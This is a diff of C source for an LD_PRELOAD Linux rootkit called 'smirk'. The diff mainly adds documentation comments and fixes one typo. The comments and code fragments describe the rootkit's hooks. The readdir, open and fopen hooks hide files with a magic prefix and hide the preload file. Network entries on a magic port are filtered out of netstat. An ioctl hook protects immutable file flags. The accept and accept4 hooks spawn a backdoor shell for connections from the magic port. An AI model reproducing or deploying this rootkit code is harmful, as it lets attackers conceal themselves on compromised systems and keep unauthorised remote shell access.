@@ -1,6 +1,14 @@
 #include "smirk.h"
 #include "utils.h"
 
+/*
+ * Function:  init
+ * --------------------
+ * the constructor checks if exists the killswitch and uninstall the rootkit
+ * if there isn't a killswitch file it try to install smirk
+ *
+ *  returns: nothing
+ */
 void __attribute ((constructor))
 init(void)
 {
@@ -22,6 +30,14 @@ init(void)
     #endif
 }
 
+/*
+ * Function:  end
+ * --------------------
+ * just en empty distructor for debug purposes
+ * that rug really tied the room together, did it not? :D B.L.
+ *
+ *  returns: nothing
+ */
 __attribute__((destructor))
 void end (void) {
     #ifdef DEBUG
@@ -29,6 +45,15 @@ void end (void) {
     #endif
 }
 
+/*
+ * Function:  load_libc
+ * --------------------
+ * dynamically load libc and the specified function
+ *
+ *  funcname: the function to load
+ *
+ *  returns: the pointer to the libc function and stores on global "libc" the libc library
+ */
 void *load_libc(char *funcname){
     if (!libc) {
         libc=dlopen(LIBC, RTLD_LAZY);
@@ -36,6 +61,12 @@ void *load_libc(char *funcname){
     return dlsym(libc, funcname);
 }
 
+/*
+ * Function:  readdir
+ * --------------------
+ * readdir hijacking
+ * if it find ls.so.preload or a file that starts with MAGIC_PREFIX omits it and clean output
+ */
 struct dirent *readdir(DIR *dirp)
 {
     #ifdef DEBUG
@@ -55,7 +86,8 @@ struct dirent *readdir(DIR *dirp)
 
     char filename[PATH_MAX];
     int fn_size;
-    // take the filename and removes grabage chars after \0
+
+    // take the filename and removes garbage chars after \0
     for (fn_size = 0; dir->d_name[fn_size] != '\0'; fn_size++){
         filename[fn_size] = dir->d_name[fn_size];
     }
@@ -75,6 +107,13 @@ struct dirent *readdir(DIR *dirp)
     return dir;
 }
 
+/*
+ * Function:  open
+ * --------------------
+ * open hijacking
+ * if it's a network file (netstat case) it filter values with MAGIC_PORT
+ * if the file name contains magic prefix it return "file doesn't exists"
+ */
 int open(const char *pathname, int flags, mode_t mode){
     #ifdef DEBUG
     printf("[-] hooking open\n");
@@ -112,6 +151,13 @@ int open(const char *pathname, int flags, mode_t mode){
     return hooked_open(pathname, flags, mode);
 }
 
+/*
+ * Function:  fopen
+ * --------------------
+ * fopen hijacking
+ * if it's a network file (netstat case) it filter values with MAGIC_PORT
+ * if the file name contains magic prefix it return "file doesn't exists"
+ */
 FILE *fopen(const char *pathname, const char *mode)
 {
     #ifdef DEBUG
@@ -143,7 +189,13 @@ FILE *fopen(const char *pathname, const char *mode)
     return hooked_fopen(real_pathname, mode);
 }
 
-
+/*
+ * Function:  fopen64
+ * --------------------
+ * fopen64 hijacking
+ * if it's a network file (netstat case) it filter values with MAGIC_PORT
+ * if the file name contains magic prefix it return "file doesn't exists"
+ */
 FILE *fopen64(const char *pathname, const char *mode)
 {
     #ifdef DEBUG
@@ -175,6 +227,16 @@ FILE *fopen64(const char *pathname, const char *mode)
     return hooked_fopen64(real_pathname, mode);
 }
 
+/*
+ * Function:  is_flag_set
+ * --------------------
+ * check if the file pointed from fd has the "flags" setted or not 
+ *
+ *  fd: the file descriptor
+ *  flags: the flags to compare
+ *
+ *  returns: 1 if file flags are set as flags, otherwise 0
+ */
 int is_flag_set(int fd, unsigned long flags){
     unsigned long argp;
 
@@ -193,6 +255,13 @@ int is_flag_set(int fd, unsigned long flags){
     return 0;
 }
 
+/*
+ * Function:  ioctl
+ * --------------------
+ * ioctl hijacking
+ * if file has flags immutable and append are setted, it's avoid the possibiity to remove them
+ * and it doesn't return them on GETFLAGS request
+ */
 int ioctl(int fd, unsigned long request, unsigned long *argp){
     #ifdef DEBUG
     printf("[-] hooking ioctl\n");
@@ -218,6 +287,12 @@ int ioctl(int fd, unsigned long request, unsigned long *argp){
     return hooked_ioctl(fd, request, argp);
 }
 
+/*
+ * Function:  accept4
+ * --------------------
+ * accept4 hijacking
+ * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
+ */
 int accept4(int socket, struct sockaddr_in *address, socklen_t *address_len, int flags){
     #ifdef DEBUG
     printf("[-] hooking accept4\n");
@@ -246,6 +321,12 @@ int accept4(int socket, struct sockaddr_in *address, socklen_t *address_len, int
     return fd;
 }
 
+/*
+ * Function:  accept
+ * --------------------
+ * accept hijacking
+ * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
+ */
 int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
     #ifdef DEBUG
     printf("[-] hooking accept\n");
